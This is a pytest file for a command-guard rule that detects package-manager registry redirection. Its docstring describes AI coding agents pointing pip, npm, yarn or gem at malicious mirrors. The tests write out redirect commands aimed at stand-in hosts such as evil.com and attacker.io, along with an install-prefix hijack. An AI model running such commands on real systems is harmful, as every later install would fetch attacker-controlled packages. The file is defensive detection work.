"""Tests for supply_chain.pkg_mirror_redirect rule.

Story: AI agents redirecting package managers to malicious registries
is a supply chain attack: every subsequent `pip install` or `npm install`
then fetches from attacker-controlled infrastructure.

Attack sources:
- Berkeley RDI 2025: SWE-bench agents modified pip config to point to
  evil PyPI mirrors, causing all future installs to serve backdoored packages.
- MITRE ATT&CK T1195.001 (Supply Chain Compromise: Compromise Software Dependencies)

Rule contracts (supply_chain.pkg_mirror_redirect):
- pip config set global.index-url https://evil.com/simple      → BLOCK
- pip config set global.extra-index-url https://evil.com/       → BLOCK
- pip3 config set global.index-url https://attacker.io/         → BLOCK
- npm config set registry https://evil.com/npm/                 → BLOCK
- npm set registry https://evil.com                             → BLOCK
- yarn config set registry https://evil.com                     → BLOCK
- gem sources --add https://evil.com                            → BLOCK
- npm config set prefix /tmp/malicious                          → BLOCK (hijack install path)
- pip install requests                                          → ALLOW (normal install)
- pip config list                                               → ALLOW (read-only)
- pip config get global.index-url                               → ALLOW (read-only)
- npm config get registry                                       → ALLOW (read-only)
- npm config set cache /home/user/.npm                          → ALLOW (non-registry config)
"""
from __future__ import annotations
from pathlib import Path
import sys
import pytest

sys.path.insert(0, str(Path(__file__).parent))
from bashguard.models import ExecutionContext, Severity


@pytest.fixture()
def ctx():
    return ExecutionContext(cwd="/home/user/project")


def _rule():
    from bashguard.rules.supply_chain import PkgMirrorRedirectRule
    return PkgMirrorRedirectRule()


class TestPipMirrorRedirect:
    def test_pip_index_url_blocked(self, ctx):
        findings = _rule().check("pip config set global.index-url https://evil.com/simple", ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "supply_chain.pkg_mirror_redirect"
        assert findings[0].severity == Severity.CRITICAL

    def test_pip_extra_index_url_blocked(self, ctx):
        findings = _rule().check("pip config set global.extra-index-url https://evil.com/", ctx)
        assert len(findings) == 1

    def test_pip3_index_url_blocked(self, ctx):
        findings = _rule().check("pip3 config set global.index-url https://attacker.io/", ctx)
        assert len(findings) == 1

    def test_pip_config_list_allowed(self, ctx):
        assert _rule().check("pip config list", ctx) == []

    def test_pip_config_get_allowed(self, ctx):
        assert _rule().check("pip config get global.index-url", ctx) == []

    def test_pip_install_allowed(self, ctx):
        assert _rule().check("pip install requests", ctx) == []


class TestNpmMirrorRedirect:
    def test_npm_registry_blocked(self, ctx):
        findings = _rule().check("npm config set registry https://evil.com/npm/", ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "supply_chain.pkg_mirror_redirect"

    def test_npm_set_registry_blocked(self, ctx):
        findings = _rule().check("npm set registry https://evil.com", ctx)
        assert len(findings) == 1

    def test_npm_prefix_tmp_blocked(self, ctx):
        """Redirecting npm install prefix to /tmp is a local hijack."""
        findings = _rule().check("npm config set prefix /tmp/malicious", ctx)
        assert len(findings) == 1

    def test_npm_config_get_allowed(self, ctx):
        assert _rule().check("npm config get registry", ctx) == []

    def test_npm_config_cache_allowed(self, ctx):
        """Setting cache dir is not a registry redirect."""
        assert _rule().check("npm config set cache /home/user/.npm", ctx) == []


class TestYarnMirrorRedirect:
    def test_yarn_registry_blocked(self, ctx):
        findings = _rule().check("yarn config set registry https://evil.com", ctx)
        assert len(findings) == 1

    def test_yarn_config_list_allowed(self, ctx):
        assert _rule().check("yarn config list", ctx) == []


class TestGemMirrorRedirect:
    def test_gem_sources_add_blocked(self, ctx):
        findings = _rule().check("gem sources --add https://evil.com", ctx)
        assert len(findings) == 1

    def test_gem_sources_list_allowed(self, ctx):
        assert _rule().check("gem sources --list", ctx) == []

    def test_gem_install_allowed(self, ctx):
        assert _rule().check("gem install rails", ctx) == []


class TestUnrelated:
    def test_git_allowed(self, ctx):
        assert _rule().check("git pull", ctx) == []

    def test_curl_allowed(self, ctx):
        assert _rule().check("curl -s https://example.com", ctx) == []
